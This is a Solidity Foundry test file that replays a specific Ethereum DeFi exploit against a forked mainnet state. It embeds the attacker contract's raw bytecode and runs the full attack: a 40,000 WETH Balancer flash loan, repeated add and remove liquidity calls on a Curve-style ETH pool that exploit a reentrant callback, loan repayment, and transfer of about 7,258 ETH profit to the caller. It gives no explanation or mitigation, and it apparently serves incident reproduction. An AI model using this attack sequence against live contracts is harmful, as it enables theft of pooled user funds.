// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0xb676d789bb8b66a08105c844a49c2bcffb400e5c1cfabd4bc30cca4bff3c9801
// https://etherscan.io/address/0xDCe5d6b41C32f578f875EfFfc0d422C57A75d7D8

interface I {
    function flashLoan(address, address[] memory, uint256[] memory, bytes memory) external payable;
    function withdraw(uint256) external payable;
    function remove_liquidity(uint256, uint256[2] memory) external payable;
    function deposit() external payable;
    function add_liquidity(uint256[2] memory, uint256) external payable;
    function balanceOf(address) external payable returns (uint256);
    function remove_liquidity_one_coin(uint256, int128, uint256) external payable;
    function totalSupply() external payable returns (uint256);
    function transfer(address, uint256) external payable;
}

contract X30fb is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xb676d789bb8b66a08105c844a49c2bcffb400e5c1cfabd4bc30cca4bff3c9801");
    }

    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x785e = 0x785EcE420e92B99a391C95F9895C78Aa3c938833;
    address constant xba12 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xc4c3 = 0xC4C319E2D4d66CcA4464C0c2B32c9Bd23ebe784e;

    address x5b43;
    address xdd17;

    uint256 t_call = 0;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 17806771); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x321bc74f3ea387f6dbacc4da74201ca2712c82da49a0f758b119e0394f20f628));

        // https://explorer.phalcon.xyz/tx/eth/0x321bc74f3ea387f6dbacc4da74201ca2712c82da49a0f758b119e0394f20f628
        this.x321bc74f();
        // https://explorer.phalcon.xyz/tx/eth/0x431103213d34873abb561fdd7cc66574af5dc77698ce9515533df3e0d7d3d2cb
        this.x43110321();
        // https://explorer.phalcon.xyz/tx/eth/0x188171c62e3a54ee5df452b46ad5106638606d28cc73a80bd71787ff3a37de0b
        this.x188171c6();
        // https://explorer.phalcon.xyz/tx/eth/0xf7704b5c4dabd8e6f94391b48467fedfcf02f5d5820fa4d737be464515fc1fc0
        this.xf7704b5c();
        // https://explorer.phalcon.xyz/tx/eth/0xb676d789bb8b66a08105c844a49c2bcffb400e5c1cfabd4bc30cca4bff3c9801
        xf34db996();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 17806548); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x321bc74f3ea387f6dbacc4da74201ca2712c82da49a0f758b119e0394f20f628
        this.x321bc74f();
        vm.warp(1690730123);
        vm.roll(17806674);
        // https://explorer.phalcon.xyz/tx/eth/0x431103213d34873abb561fdd7cc66574af5dc77698ce9515533df3e0d7d3d2cb
        this.x43110321();
        vm.warp(1690730279);
        vm.roll(17806687);
        // https://explorer.phalcon.xyz/tx/eth/0x188171c62e3a54ee5df452b46ad5106638606d28cc73a80bd71787ff3a37de0b
        this.x188171c6();
        vm.warp(1690731143);
        vm.roll(17806759);
        // https://explorer.phalcon.xyz/tx/eth/0xf7704b5c4dabd8e6f94391b48467fedfcf02f5d5820fa4d737be464515fc1fc0
        this.xf7704b5c();
        vm.warp(1690731287);
        vm.roll(17806771);
        // https://explorer.phalcon.xyz/tx/eth/0xb676d789bb8b66a08105c844a49c2bcffb400e5c1cfabd4bc30cca4bff3c9801
        xf34db996();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 17806771); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1690731287);
        vm.roll(17806772);
        // https://explorer.phalcon.xyz/tx/eth/0xb676d789bb8b66a08105c844a49c2bcffb400e5c1cfabd4bc30cca4bff3c9801
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            keccak256(abi.encode(RECEIVER, uint256(3))),
            bytes32(uint256(1000000000000000000000000))
        );
        {
            address token = address(0xC4C319E2D4d66CcA4464C0c2B32c9Bd23ebe784e);
            uint256 target = 1000000000000000000000000;
            uint256 snap = vm.snapshotState();
            bool found = false;
            uint256 foundSlot = type(uint256).max;
            for (uint256 slot = 0; slot < 100; slot++) {
                vm.revertToState(snap);
                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(slot))), bytes32(uint256(target)));
                uint256 bal = IERC20(token).balanceOf(RECEIVER);
                if (bal != target) continue;
                found = true;
                foundSlot = slot;
                break;
            }
            if (!found) {
                vm.revertToState(snap);
            } else {
                emit log_named_address("GF_SLOT_CACHE_TOKEN", token);
                emit log_named_uint("GF_SLOT_CACHE_SLOT", foundSlot);
                emit log_named_uint("GF_SLOT_CACHE_IS_VYPER", 0);
                vm.revertToState(snap);
                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(foundSlot))), bytes32(uint256(target)));
                require(IERC20(token).balanceOf(RECEIVER) == target, "GF: final store failed");
            }
        }
        xf34db996();
    }

    function x43110321() public {
        x785e.call{value: 100000000000000000}("");
    }

    function xf7704b5c() public {
        _constructor_();
    }

    function xf34db996() public {
        address[] memory arr01 = new address[](1);
        arr01[0] = xc02a;
        uint256[] memory arr02 = new uint256[](1);
        arr02[0] = 40000000000000000000000;
        I(xba12).flashLoan(r, arr01, arr02, "");
    }

    function x188171c6() public {
        xdd17 = address(new Xdd17());
    }

    function x321bc74f() public {
        x5b43 = address(new X5b43());
    }

    function call() public payable {
        t_call++;

        if (t_call == 1) {
            return;
        }
        if (t_call == 2) {
            uint256[2] memory arr10;
            arr10[0] = 20000000000000000000000;
            arr10[1] = 0;
            I(xc4c3).add_liquidity{value: 20000000000000000000000}(arr10, 0);

            // uint256 v1 = 54172263198716125231364;
            uint256 v1 = I(xc4c3).balanceOf(r);
            console2.log("I(xc4c3).balanceOf(r)\t\t->", "54172263198716125231364 (54172.2631 ether)");
            return;
        }
        if (t_call <= 4) {
            return;
        }
    }

    function _constructor_() public {
        bytes memory rt =
            hex"6080604052600436106100595760003560e01c806306ec16f8146101a95780633fc8cef3146101c95780639725936214610205578063f04f27071461021a578063f34db9961461023a578063fdff9b811461025a57600080fd5b366101a4576004546001600160a01b031633036101a2576001600760008282546100839190610cca565b90915550506007546001036101a2576000604051806040016040528060026008546100ae9190610ce3565b815260006020909101526004546008549192506001600160a01b031690630b4c7e4d906100dd90600290610ce3565b8360006040518463ffffffff1660e01b81526004016100fd929190610d2e565b6000604051808303818588803b15801561011657600080fd5b505af115801561012a573d6000803e3d6000fd5b50506002546040516370a0823160e01b8152306004820152600094506001600160a01b0390911692506370a082319150602401602060405180830381865afa15801561017a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061019e9190610d49565b5050505b005b600080fd5b3480156101b557600080fd5b506101a26101c4366004610d7e565b61026f565b3480156101d557600080fd5b506000546101e9906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b34801561021157600080fd5b506101a2610317565b34801561022657600080fd5b506101a2610235366004610edf565b610335565b34801561024657600080fd5b506101a2610255366004610fe8565b610835565b34801561026657600080fd5b506101a26109b1565b6003546001600160a01b0316331461028657600080fd5b6040516370a0823160e01b81523060048201526000906001600160a01b038316906370a0823190602401602060405180830381865afa1580156102cd573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102f19190610d49565b9050801561031357600354610313906001600160a01b03848116911683610a0c565b5050565b6003546001600160a01b0316330361032e57600080fd5b6001600955565b600854600054604051632e1a7d4d60e01b8152600481018390526001600160a01b0390911690632e1a7d4d90602401600060405180830381600087803b15801561037e57600080fd5b505af1158015610392573d6000803e3d6000fd5b50505050600060405180604001604052806002846103b09190610ce3565b815260006020909101526004549091506001600160a01b0316630b4c7e4d6103d9600285610ce3565b8360006040518463ffffffff1660e01b81526004016103f9929190610d2e565b6000604051808303818588803b15801561041257600080fd5b505af1158015610426573d6000803e3d6000fd5b50506002546040516370a0823160e01b8152306004820152600094506001600160a01b0390911692506370a082319150602401602060405180830381865afa158015610476573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061049a9190610d49565b604080518082018252600080825260208201526004805492516316cd8e2760e21b815293945090926001600160a01b0390921691635b36389c916104e291869186910161100a565b60408051808303816000875af1158015610500573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610524919061101e565b506002546040516370a0823160e01b81523060048201526001600160a01b03909116906370a0823190602401602060405180830381865afa15801561056d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105919190610d49565b915060006001600260009054906101000a90046001600160a01b03166001600160a01b03166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156105ea573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061060e9190610d49565b610618919061109e565b905082811015610626578092505b60048054604051630d2680e960e11b815291820185905260006024830181905260448301526001600160a01b031690631a4d01d2906064016020604051808303816000875af115801561067d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106a19190610d49565b506000805460408051630d0e30db60e41b8152905147936001600160a01b039093169263d0e30db09285926004808301939282900301818588803b1580156106e857600080fd5b505af11580156106fc573d6000803e3d6000fd5b505060055460005461071f94506001600160a01b03908116935016905088610a0c565b6000546040516370a0823160e01b81523060048201526001600160a01b0390911690632e1a7d4d9082906370a0823190602401602060405180830381865afa15801561076f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107939190610d49565b6040518263ffffffff1660e01b81526004016107b191815260200190565b600060405180830381600087803b1580156107cb57600080fd5b505af11580156107df573d6000803e3d6000fd5b504792505081159050610828576003546040516001600160a01b039091169082156108fc029083906000818181858888f19350505050158015610826573d6000803e3d6000fd5b505b5050505050505050505050565b60006009541161084457600080fd5b6003546001600160a01b0316331461085b57600080fd5b600654610869906004610cca565b431161087457600080fd5b806203c3721461088357600080fd5b60088290556040805160018082528183019092526000916020808301908036833701905050905082816000815181106108be576108be6110b1565b602090810291909101015260408051600180825281830190925260009181602001602082028036833750506000805483519394506001600160a01b03169284925061090b5761090b6110b1565b6001600160a01b03928316602091820292909201015260055416635c38449e30838560006040519080825280601f01601f191660200182016040528015610959576020820181803683370190505b506040518563ffffffff1660e01b81526004016109799493929190611117565b600060405180830381600087803b15801561099357600080fd5b505af11580156109a7573d6000803e3d6000fd5b5050505050505050565b6003546001600160a01b031633146109c857600080fd5b478015610a09576003546040516001600160a01b039091169082156108fc029083906000818181858888f19350505050158015610313573d6000803e3d6000fd5b50565b604080516001600160a01b038416602482015260448082018490528251808303909101815260649091019091526020810180516001600160e01b031663a9059cbb60e01b179052610a5e908490610a63565b505050565b6000610ab8826040518060400160405280602081526020017f5361666545524332303a206c6f772d6c6576656c2063616c6c206661696c6564815250856001600160a01b0316610b3a9092919063ffffffff16565b805190915015610a5e5780806020019051810190610ad691906111b3565b610a5e5760405162461bcd60e51b815260206004820152602a60248201527f5361666545524332303a204552433230206f7065726174696f6e20646964206e6044820152691bdd081cdd58d8d9595960b21b60648201526084015b60405180910390fd5b6060610b498484600085610b53565b90505b9392505050565b606082471015610bb45760405162461bcd60e51b815260206004820152602660248201527f416464726573733a20696e73756666696369656e742062616c616e636520666f6044820152651c8818d85b1b60d21b6064820152608401610b31565b843b610c025760405162461bcd60e51b815260206004820152601d60248201527f416464726573733a2063616c6c20746f206e6f6e2d636f6e74726163740000006044820152606401610b31565b600080866001600160a01b03168587604051610c1e91906111d5565b60006040518083038185875af1925050503d8060008114610c5b576040519150601f19603f3d011682016040523d82523d6000602084013e610c60565b606091505b5091509150610c70828286610c7b565b979650505050505050565b60608315610c8a575081610b4c565b825115610c9a5782518084602001fd5b8160405162461bcd60e51b8152600401610b3191906111f1565b634e487b7160e01b600052601160045260246000fd5b80820180821115610cdd57610cdd610cb4565b92915050565b600082610d0057634e487b7160e01b600052601260045260246000fd5b500490565b8060005b6002811015610d28578151845260209384019390910190600101610d09565b50505050565b60608101610d3c8285610d05565b8260408301529392505050565b600060208284031215610d5b57600080fd5b5051919050565b80356001600160a01b0381168114610d7957600080fd5b919050565b600060208284031215610d9057600080fd5b610b4c82610d62565b634e487b7160e01b600052604160045260246000fd5b604051601f8201601f1916810167ffffffffffffffff81118282101715610dd857610dd8610d99565b604052919050565b600067ffffffffffffffff821115610dfa57610dfa610d99565b5060051b60200190565b600082601f830112610e1557600080fd5b81356020610e2a610e2583610de0565b610daf565b82815260059290921b84018101918181019086841115610e4957600080fd5b8286015b84811015610e645780358352918301918301610e4d565b509695505050505050565b600082601f830112610e8057600080fd5b813567ffffffffffffffff811115610e9a57610e9a610d99565b610ead601f8201601f1916602001610daf565b818152846020838601011115610ec257600080fd5b816020850160208301376000918101602001919091529392505050565b60008060008060808587031215610ef557600080fd5b843567ffffffffffffffff80821115610f0d57600080fd5b818701915087601f830112610f2157600080fd5b81356020610f31610e2583610de0565b82815260059290921b8401810191818101908b841115610f5057600080fd5b948201945b83861015610f7557610f6686610d62565b82529482019490820190610f55565b98505088013592505080821115610f8b57600080fd5b610f9788838901610e04565b94506040870135915080821115610fad57600080fd5b610fb988838901610e04565b93506060870135915080821115610fcf57600080fd5b50610fdc87828801610e6f565b91505092959194509250565b60008060408385031215610ffb57600080fd5b50508035926020909101359150565b82815260608101610b4c6020830184610d05565b60006040828403121561103057600080fd5b82601f83011261103f57600080fd5b6040516040810181811067ffffffffffffffff8211171561106257611062610d99565b806040525080604084018581111561107957600080fd5b845b8181101561109357805183526020928301920161107b565b509195945050505050565b81810381811115610cdd57610cdd610cb4565b634e487b7160e01b600052603260045260246000fd5b60005b838110156110e25781810151838201526020016110ca565b50506000910152565b600081518084526111038160208601602086016110c7565b601f01601f19169290920160200192915050565b6001600160a01b0385811682526080602080840182905286519184018290526000928782019290919060a0860190855b81811015611165578551851683529483019491830191600101611147565b5050858103604087015287518082529082019350915080870160005b8381101561119d57815185529382019390820190600101611181565b505050508281036060840152610c7081856110eb565b6000602082840312156111c557600080fd5b81518015158114610b4c57600080fd5b600082516111e78184602087016110c7565b9190910192915050565b602081526000610b4c60208301846110eb56fea26469706673582212200a68ce339a0939fc7b22b8501f8d0f5ada3f5413ebc9644853a30332ae07e1bf64736f6c63430008120033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) public {
        I(xc02a).withdraw(40000000000000000000000);

        uint256[2] memory arr06;
        arr06[0] = 20000000000000000000000;
        arr06[1] = 0;
        I(xc4c3).add_liquidity{value: 20000000000000000000000}(arr06, 0);

        // uint256 v1 = 19895211407912664127979;
        uint256 v1 = I(xc4c3).balanceOf(r);
        console2.log("I(xc4c3).balanceOf(r)\t\t->", "19895211407912664127979 (19895.2114 ether)");

        uint256[2] memory arr08;
        arr08[0] = 0;
        arr08[1] = 0;
        I(xc4c3).remove_liquidity(v1, arr08);

        // uint256 v2 = 34277051790803461103385;
        uint256 v2 = I(xc4c3).balanceOf(r);
        console2.log("I(xc4c3).balanceOf(r)\t\t->", "34277051790803461103385 (34277.5179 ether)");
        // uint256 v3 = 15910047846279412434493;
        uint256 v3 = I(xc4c3).totalSupply();
        console2.log("I(xc4c3).totalSupply()\t->", "15910047846279412434493 (15910.4784 ether)");
        I(xc4c3).remove_liquidity_one_coin(15910047846279412434492, 0, 0);
        I(xc02a).deposit{value: 47258701569350004501158}();
        I(xc02a).transfer(xba12, 40000000000000000000000);
        // uint256 v4 = 7258701569350004501158;
        uint256 v4 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "7258701569350004501158 (7258.7015 ether)");
        I(xc02a).withdraw(v4);
        address(tx.origin).call{value: 7258701569350004501158}("");
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract X5b43 {
    address immutable r = address(this);
    receive() external payable {}

    constructor() payable {}

    fallback() external payable {
        revert("no such function");
    }
}

contract Xdd17 {
    address immutable r = address(this);
    receive() external payable {}

    constructor() payable {}

    fallback() external payable {
        revert("no such function");
    }
}
